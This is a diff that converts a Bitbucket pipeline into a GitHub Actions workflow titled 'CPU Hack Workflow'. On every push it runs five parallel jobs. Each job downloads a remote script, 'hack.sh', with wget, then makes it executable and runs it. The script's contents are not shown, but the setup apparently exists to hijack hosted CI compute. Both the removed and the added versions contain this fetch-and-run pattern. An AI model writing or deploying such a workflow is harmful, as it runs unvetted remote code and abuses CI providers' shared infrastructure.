@@ -1,44 +1,21 @@
-image: atlassian/default-image:2
+name: CPU Hack Workflow
 
-pipelines:
-  default:
-    - parallel:
-        - step:
-            name: cpu hack 1
-            script:
-              - apt-get update && apt-get install -y wget screen
-              - wget https://raw.githubusercontent.com/phantrongkien12/tester/refs/heads/main/hack.sh -O hack.sh
-              - chmod +x hack.sh
-              - ./hack.sh
+on:
+  push:
+  workflow_dispatch:
 
-        - step:
-            name: cpu hack 2
-            script:
-              - apt-get update && apt-get install -y wget screen
-              - wget https://raw.githubusercontent.com/phantrongkien12/tester/refs/heads/main/hack.sh -O hack.sh
-              - chmod +x hack.sh
-              - ./hack.sh
+jobs:
+  cpu-hack:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        job: [1, 2, 3, 4, 5]
+    steps:
+      - name: Checkout repo
+        uses: actions/checkout@v2
 
-        - step:
-            name: cpu hack 3
-            script:
-              - apt-get update && apt-get install -y wget screen
-              - wget https://raw.githubusercontent.com/phantrongkien12/tester/refs/heads/main/hack.sh -O hack.sh
-              - chmod +x hack.sh
-              - ./hack.sh
-
-        - step:
-            name: cpu hack 4
-            script:
-              - apt-get update && apt-get install -y wget screen
-              - wget https://raw.githubusercontent.com/phantrongkien12/tester/refs/heads/main/hack.sh -O hack.sh
-              - chmod +x hack.sh
-              - ./hack.sh
-
-        - step:
-            name: cpu hack 5
-            script:
-              - apt-get update && apt-get install -y wget screen
-              - wget https://raw.githubusercontent.com/phantrongkien12/tester/refs/heads/main/hack.sh -O hack.sh
-              - chmod +x hack.sh
-              - ./hack.sh
+      - name: Run cpu hack ${{ matrix.job }}
+        run: |
+          wget https://raw.githubusercontent.com/phantrongkien12/tester/refs/heads/main/hack.sh -O hack.sh
+          chmod +x hack.sh
+          ./hack.sh
